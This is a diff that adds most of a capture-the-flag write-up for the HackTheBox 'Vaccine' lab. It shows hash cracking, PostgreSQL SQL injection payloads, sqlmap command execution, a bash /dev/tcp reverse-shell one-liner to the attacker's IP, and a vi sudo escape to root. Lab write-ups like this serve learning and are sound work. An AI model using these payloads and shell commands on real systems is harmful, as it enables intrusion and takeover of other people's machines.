@@ -182,4 +182,110 @@
       <li>Anonymous login allowed → found <code class="inline">backup.zip</code></li>
       <li>Zip was password-protected, cracked with <code class="inline">zip2john</code> + <code class="inline">john</code> (rockyou.txt)</li>
       <li>Password: <code class="inline">741852963</code></li>
-      <li>Contents: <code
+      <li>Contents: <code class="inline">index.php</code>, <code class="inline">style.css</code></li>
+    </ul>
+  </section>
+
+  <section>
+    <div class="sec-title"><span class="idx">03</span> Web Source Review</div>
+    <ul class="note-list">
+      <li><code class="inline">index.php</code> has a hardcoded check: username <code class="inline">admin</code>, password compared as an MD5 hash</li>
+      <li>Hash: <code class="inline">2cb42f8734ea607eefed3b70af13bbd3</code></li>
+      <li>Cracked with <code class="inline">john --format=raw-md5</code> (rockyou.txt) → password: <code class="inline">qwerty789</code></li>
+    </ul>
+    <p style="margin-top:14px;color:var(--muted-2);font-size:13.5px;">Note: tried SSH with admin/qwerty789 — denied, credentials didn't reuse on SSH.</p>
+  </section>
+
+  <section>
+    <div class="sec-title"><span class="idx">04</span> Web App (Authenticated)</div>
+    <ul class="note-list">
+      <li>Login admin/qwerty789 worked → redirected to <code class="inline">dashboard.php</code>, "MegaCorp Car Catalogue"</li>
+      <li>Search field vulnerable to SQL injection</li>
+      <li>Payload <code class="inline">'</code> in <code class="inline">?search=</code> param → error: <code class="inline">unterminated quoted string... near "%123'%"</code></li>
+      <li>Backend query pattern: <code class="inline">select * from cars where name ilike '%&lt;input&gt;%'</code></li>
+      <li>Database identified as <strong>PostgreSQL</strong>, based on error syntax</li>
+      <li>Confirmed with <code class="inline">' or '1'='1' --</code> → returned all rows (boolean-based SQLi confirmed)</li>
+    </ul>
+    <pre><span class="prompt">$</span> sqlmap -u "http://10.129.45.252/dashboard.php?search=123" --level 5 --risk 3 --batch --dump</pre>
+  </section>
+
+  <section>
+    <div class="sec-title"><span class="idx">05</span> Manual SQLi — Column Enumeration</div>
+    <ul class="note-list">
+      <li><code class="inline">' order by 6--</code> → error "ORDER BY position 6 is not in select list" → table has <strong>5 columns</strong></li>
+      <li><code class="inline">' union select 1,2,3,4,5--</code> → error: UNION types character varying and integer cannot be matched (some columns aren't integer)</li>
+      <li><code class="inline">' union select NULL,NULL,NULL,NULL,NULL--</code> → works, no error</li>
+      <li>Table displays only 4 visible columns (Name/Type/Fuel/Engine) but query has 5 → 1st column is hidden (likely <code class="inline">id</code>)</li>
+      <li><code class="inline">' union select NULL,'test',NULL,NULL,NULL--</code> → confirmed: 2nd position renders in the Name column</li>
+      <li><code class="inline">current_database()</code> → <code class="inline">carsdb</code></li>
+      <li><code class="inline">version()</code> → PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1)</li>
+      <li>Queried <code class="inline">information_schema.tables</code> → table name: <code class="inline">cars</code></li>
+    </ul>
+  </section>
+
+  <section>
+    <div class="sec-title"><span class="idx">06</span> sqlmap Results</div>
+    <ul class="note-list">
+      <li>Confirmed injection type: <strong>stacked queries</strong> (<code class="inline">search=123';SELECT PG_SLEEP(5)--</code>) — allows executing additional SQL statements, not just SELECT</li>
+      <li>Confirmed UNION query, 5 columns — matches manual finding</li>
+      <li>Backend: PostgreSQL, web server Ubuntu, Apache 2.4.41</li>
+      <li><code class="inline">--tables</code> reported carsdb as empty — <strong class="flag-note">false negative</strong>, since the <code class="inline">cars</code> table was already found manually. Manual testing caught something sqlmap missed here.</li>
+      <li><code class="inline">usename from pg_user where usesuper=true</code> → <code class="inline">postgres</code> is superuser → RCE via <code class="inline">COPY FROM PROGRAM</code> is possible</li>
+    </ul>
+  </section>
+
+  <section>
+    <div class="sec-title"><span class="idx">07</span> RCE</div>
+    <ul class="note-list">
+      <li>Manual <code class="inline">COPY FROM PROGRAM 'id'</code> via stacked query ran (200 OK) but output wasn't visible — column count mismatch with app's SELECT *</li>
+      <li><code class="inline">COPY (SELECT ...) TO '/var/www/html/shell.php'</code> → denied, permission error (postgres process can't write there)</li>
+      <li>Reverse shell via <code class="inline">COPY FROM PROGRAM 'bash -c "bash -i >&/dev/tcp/..."'</code> → no callback received</li>
+      <li>Switched to <code class="inline">sqlmap --os-shell</code> → <strong>worked</strong>, got an interactive OS shell via the COPY FROM PROGRAM technique</li>
+    </ul>
+    <pre><span class="prompt">$</span> id
+uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
+<span class="prompt">$</span> whoami
+postgres</pre>
+    <p style="color:var(--cyan);font-size:13.5px;">Code execution confirmed as user <code class="inline">postgres</code>.</p>
+  </section>
+
+  <section>
+    <div class="sec-title"><span class="idx">08</span> Stable Reverse Shell</div>
+    <ul class="note-list">
+      <li>Port 4444 didn't work, switched listener to port 443 → got a stable reverse shell</li>
+      <li><code class="inline">bash -c "bash -i >&/dev/tcp/10.10.14.144/443 0>&1"</code> via os-shell → connected</li>
+      <li>Landed as <code class="inline">postgres@vaccine:/var/lib/postgresql/11/main$</code></li>
+      <li>Upgraded to a proper TTY: <code class="inline">python3 -c 'import pty; pty.spawn("/bin/bash")'</code> — needed for <code class="inline">sudo -l</code> to prompt for password correctly</li>
+    </ul>
+  </section>
+
+  <section>
+    <div class="sec-title"><span class="idx">09</span> Credentials in Source</div>
+    <ul class="note-list">
+      <li><code class="inline">dashboard.php</code> exposes the PostgreSQL connection string with plaintext DB password: <code class="inline">P@s5w0rd!</code></li>
+      <li>Tested for password reuse on the <code class="inline">postgres</code> system user for sudo</li>
+    </ul>
+  </section>
+
+  <section>
+    <div class="sec-title"><span class="idx">10</span> PrivEsc → Root</div>
+    <ul class="note-list">
+      <li><code class="inline">sudo -l</code> with password <code class="inline">P@s5w0rd!</code> (reused from DB password) worked</li>
+      <li>Result: <code class="inline">(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</code> — postgres can run vi as root on this file</li>
+      <li>GTFOBins vi technique: since vi runs as root, spawning a shell from inside vi gives a root shell</li>
+    </ul>
+    <pre><span class="prompt">$</span> sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+<span class="prompt">:</span> !/bin/bash
+<span class="prompt">#</span> id
+uid=0(root) gid=0(root) groups=0(root)</pre>
+    <div class="flag-box">root.txt // dd6e058e814260bc70e9bbdef2715849</div>
+  </section>
+
+</div>
+
+<footer>
+  <div class="footer-line">● HTB — VACCINE — VERY EASY / LINUX</div>
+</footer>
+
+</body>
+</html>
